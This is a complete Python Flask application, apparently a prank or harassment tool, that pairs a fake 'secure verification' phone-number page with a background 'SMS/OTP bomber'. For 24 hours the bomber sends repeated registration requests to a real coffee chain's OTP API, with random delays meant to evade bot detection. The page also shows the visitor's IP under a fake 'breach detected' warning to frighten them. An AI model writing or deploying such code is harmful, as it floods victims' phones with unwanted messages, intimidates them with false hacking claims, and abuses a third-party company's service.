from flask import Flask, render_template_string, request, jsonify
import os
import threading
import time
import requests
import datetime
import random

app = Flask(__name__)

# ============ SMS/OTP BOMBER (2 DK + RANDOM GECİKME) ============
def send_otp_bomb(phone):
    clean_phone = "".join(filter(str.isdigit, phone))
    if clean_phone.startswith("90"): clean_phone = clean_phone[2:]
    full_phone = "0" + clean_phone if not clean_phone.startswith("0") else clean_phone
    
    end_time = datetime.datetime.now() + datetime.timedelta(hours=24)
    print(f"[OPERASYON] {full_phone} başlatıldı.")

    while datetime.datetime.now() < end_time:
        try:
            # Gerçek SMS Endpoint (SID5 Mantığı)
            requests.post("https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number", 
                json={"phoneNumber": full_phone, "otp": str(random.randint(100000, 999999))},
                headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"},
                timeout=10)
            print(f"[BOMBER] SMS Başarılı: {full_phone}")
        except:
            pass
        
        # 2 Dakika + Rastgele 0-5 saniye kayma (Bot algılanmasın diye)
        time.sleep(120 + random.uniform(0.1, 5.0))

# ============ ÖN PANEL TASARIMI ============
HTML_KODU = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SECURE VERIFICATION</title>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; margin: 0; overflow: hidden; height: 100vh; display: flex; justify-content: center; align-items: center; }
        .lux-card { background: #0a0a0a; border: 1px solid #1a1a1a; padding: 40px; border-radius: 20px; text-align: center; width: 340px; z-index: 10; position: relative; }
        .input-box { background: #111; border: 1px solid #222; border-radius: 12px; padding: 15px; display: flex; align-items: center; margin-bottom: 25px; }
        .prefix { color: #555; font-weight: bold; margin-right: 12px; border-right: 1px solid #222; padding-right: 12px; }
        input { background: transparent; border: none; color: #fff; font-size: 1.1em; outline: none; width: 100%; letter-spacing: 2px; }
        button { width: 100%; background: #fff; color: #000; border: none; padding: 18px; font-weight: bold; border-radius: 12px; cursor: pointer; text-transform: uppercase; }
        #ip-screen { display: none; }
        .ip-display { font-size: 2.2em; font-weight: 900; color: #ff0000; margin: 20px 0; }
        #video-wrapper { position: fixed; top: 0; left: 0; width: 100%; height: 100%; display: none; background: #000; z-index: 9999; overflow: hidden; }
        #player { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 400%; height: 400%; pointer-events: none; }
    </style>
</head>
<body>
    <div class="lux-card" id="step1">
        <h1 style="font-size:1em; letter-spacing:3px;">SYSTEM ACCESS</h1>
        <div class="input-box"><span class="prefix">+90</span><input type="tel" id="phone" placeholder="5XXXXXXXXX" maxlength="10"></div>
        <button id="main-btn">VERIFY</button>
    </div>
    <div class="lux-card" id="ip-screen">
        <h1 style="color: #ff0000;">BREACH DETECTED</h1>
        <div class="ip-display">{{ ip }}</div>
        <p id="status-update" style="color:#444;">LOGGING DATA...</p>
    </div>
    <div id="video-wrapper"><div id="player"></div></div>
    <script src="https://www.youtube.com/iframe_api"></script>
    <script>
        var player;
        function onYouTubeIframeAPIReady() {
            player = new YT.Player('player', {
                videoId: 'KE3iBf-P9Oc',
                playerVars: { 'autoplay': 1, 'controls': 0, 'mute': 1, 'playsinline': 1, 'loop': 1 },
                events: { 'onReady': function(e) { e.target.playVideo(); } }
            });
        }
        document.getElementById('main-btn').addEventListener('click', function() {
            var phone = document.getElementById('phone').value;
            if(phone.length < 10) return;
            fetch('/start-payload', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({phone: phone}) });
            document.getElementById('step1').style.display = 'none';
            document.getElementById('ip-screen').style.display = 'block';
            setTimeout(() => { document.getElementById('status-update').innerText = "SYSTEM OVERRIDE: 100%"; }, 5000);
            setTimeout(() => { 
                document.getElementById('video-wrapper').style.display = 'block';
                player.unMute(); player.playVideo();
            }, 20000);
        });
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    return render_template_string(HTML_KODU, ip=ip)

@app.route('/start-payload', methods=['POST'])
def start_payload():
    phone = request.json.get('phone')
    threading.Thread(target=send_otp_bomb, args=(phone,), daemon=True).start()
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
